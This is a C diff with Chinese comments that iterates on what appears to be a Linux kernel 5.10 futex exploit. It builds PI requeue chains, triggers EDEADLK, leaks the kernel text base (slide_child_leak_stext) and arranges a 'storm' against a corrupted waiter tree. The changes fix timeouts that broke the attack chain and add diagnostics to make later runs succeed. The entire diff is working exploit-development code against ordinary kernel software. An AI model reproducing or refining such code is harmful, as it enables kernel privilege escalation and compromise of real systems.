@@ -488,22 +488,43 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
 
   struct timespec timeout;
   SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
-  /* mt54 (spec2-repair): PSELECT_WAIT_SECONDS 覆盖 30s 默认。waiter 超时
-   * 清理 (remove_waiter) 会对 win 后的毒树做 double-erase + prio_chain
-   * walk — 这是 win 前就上膛的内核侧定时器, 不受 mt53 静默窗口管。
-   * 修复轮把它抬到进程寿命之上 (> sleep 时长), 让清理只走进程退出路径
-   * (futex_exit_release, 0 断言, 不走 waiters 树)。mt26 win 那轮 30s
-   * 超时走树存活属 n=1 运气, 不再依赖。 */
-  long slide_wait_secs = SLIDE_WAIT_SECONDS;
-  char *mt54_ws_env = getenv("PSELECT_WAIT_SECONDS");
-  if (mt54_ws_env) slide_wait_secs = strtol(mt54_ws_env, NULL, 0);
-  if (slide_wait_secs < 1) slide_wait_secs = SLIDE_WAIT_SECONDS;
-  timeout.tv_sec += slide_wait_secs;
+  /* mt60 (R4 尸检核心修复): waiter 唤醒源。内核 5.10 源码实证 (futex.c
+   * 2152-2167): CMP_REQUEUE_PI 撞 PI 环返回 -EDEADLK 时只 break 循环把
+   * 错误交还调用者, waiter 不会被唤醒也不会挂树; 唤醒只有三条路 —
+   * 代理夺锁 (requeue_pi_wake_futex, 需 target 空闲, 不可能: owner 持有)、
+   * owner UNLOCK_PI (永不发生: owner sleep 循环)、超时。mt54 把超时抬到
+   * 200s > 进程寿命 180s = 唯一唤醒源被切断 = R2/R3/R4 全部断链在
+   * stack_copy 之前。v37 母版 (本文件 :761) 用 2s 短超时正是设计的一部分:
+   * waiter 醒 → stamp/pselect 触发链。mt54 担心的"超时清理走毒树"在
+   * mt59 时代不成立: EDEADLK 形态 waiter 从未挂树 (干净 futex_q 出队);
+   * requeue 成功形态 waiter 挂的是干净树 (storm 在 consume_go 之后才打,
+   * 而 consume_go 在 waiter 醒来之后才置位) — 风暴打毒树时 waiter 已
+   * 不在任何树上。默认 3s (requeue 在 armed+20ms 内已开火, 3s 足够环
+   * 稳定后再醒)。PSELECT_WAITER_WAKE_SECONDS 覆盖。PSELECT_WAIT_SECONDS
+   * 对 waiter 不再生效 (200s 已证明是断链配置), 仅留作兼容记录。 */
+  long mt60_wake_secs = 3;
+  char *mt60_wake_env = getenv("PSELECT_WAITER_WAKE_SECONDS");
+  if (mt60_wake_env) {
+    long mt60_parsed = strtol(mt60_wake_env, NULL, 0);
+    if (mt60_parsed >= 1) mt60_wake_secs = mt60_parsed;
+  }
+  timeout.tv_sec += mt60_wake_secs;
 
   atomic_store(&slide_waiter_waiting, 1);
-  futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
-           &slide_f_pi_target, 0);
-  futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  errno = 0;
+  long mt60_fwrq = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0,
+                            &timeout, &slide_f_pi_target, 0);
+  int mt60_fwrq_errno = errno;
+  pr_info("mt60: waiter FWRQ ret=%ld errno=%d (0=拿锁 ETIMEDOUT=110 "
+          "超时醒 EAGAIN=11 未阻塞) wake_secs=%ld\n",
+          mt60_fwrq, mt60_fwrq_errno, mt60_wake_secs);
+  fflush(stdout);
+  errno = 0;
+  long mt60_ul = futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL,
+                          NULL, 0);
+  pr_info("mt60: waiter UNLOCK_PI(chain) ret=%ld errno=%d\n", mt60_ul,
+          errno);
+  fflush(stdout);
 
   /* mt20: v37-style stamp; 或 mt19 pselect overlay (PSELECT_STAMP 未设时) */
   if (getenv("PSELECT_STAMP")) {
@@ -538,7 +559,14 @@ void *slide_owner_thread(void *arg __attribute__((unused))) {
    * → EDEADLK 快路径。armed 旗让 main 等到这一刻再开火。 */
   atomic_store(&slide_owner_chain_armed, 1);
   pr_info("mt59: owner armed - blocking on chain mutex\n");
-  futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+  errno = 0;
+  long mt60_oc = futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL,
+                          NULL, 0);
+  /* mt60: owner 醒来只可能是进程退出 (OWNERDIED) 或信号 — 正常轮此行
+   * 在进程尾才打 (或永不)。EDEADLK 回到 owner 也是这里的 ret=-1/35。 */
+  pr_info("mt60: owner chain LOCK_PI ret=%ld errno=%d (woken)\n", mt60_oc,
+          errno);
+  fflush(stdout);
 
   for (;;) {
     sleep(1);
@@ -634,6 +662,16 @@ uint64_t slide_child_leak_stext(void) {
   }
   usleep(20000);
 
+  /* mt60: requeue 前转储三个 futex 字的用户态值。R4 实证 requeue 以
+   * errno=35 (EDEADLK, 环成形) 返回 — 内核侧要求先过 cmpval 检查
+   * (futex.c:2006, curval 必须等于 1), 即 *slide_f_wait 当时 == 1,
+   * 但源码中无人显式置 1 (静态零初始化, :805 重置也是 0)。此转储把
+   * "谁写了 1" 变成下一轮的可观测事实。target/chain 的值应为 owner/
+   * waiter 的 TID (LOCK_PI 写入)。 */
+  pr_info("mt60: pre-requeue words f_wait=%u target=%u chain=%u\n",
+          slide_f_wait, slide_f_pi_target, slide_f_pi_chain);
+  fflush(stdout);
+
   errno = 0;
   long mt59_rq = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                           &slide_f_pi_target, 0);
@@ -657,8 +695,27 @@ uint64_t slide_child_leak_stext(void) {
   time_t mt59_t0 = time(NULL);
   while (!atomic_load(&slide_route_done)) {
     if (difftime(time(NULL), mt59_t0) > 12.0) {
-      pr_error("mt59: STALL route_done>12s - inert round (lost race), "
-               "aborting rc=3\n");
+      /* mt60: 原 mt59 这里用 pr_error — 但 pr_error 宏 (utils.h) 内嵌
+       * exit(-1), 打印后进程以 rc=255 退出, 后续 _exit(3) 是永不执行的
+       * 死代码 (clang -O2 直接消除了 mt60 旗标串), "rc=3 安全自弃"从
+       * mt59 交付起就是纸面语义, 实际 R4 = STALL 行 + exit(-1)/rc=255。
+       * 现改为 pr_warning (纯打印) + 旗标转储 + 显式 flush + _exit(3),
+       * rc=3 真正生效。 */
+      pr_warning("mt59: STALL route_done>12s - inert round (lost race), "
+                 "aborting rc=3\n");
+      pr_info("mt60: STALL flags waiter_ready=%d waiter_waiting=%d "
+              "owner_started=%d owner_armed=%d route_done=%d "
+              "consume_go=%d consume_calls=%d canary_hits=%d\n",
+              atomic_load(&slide_waiter_ready),
+              atomic_load(&slide_waiter_waiting),
+              atomic_load(&slide_owner_started),
+              atomic_load(&slide_owner_chain_armed),
+              atomic_load(&slide_route_done),
+              atomic_load(&slide_consume_go),
+              atomic_load(&slide_consume_calls),
+              slide_canary_hits);
+      fflush(stdout);
+      fflush(stderr);
       _exit(3);
     }
     usleep(100000);
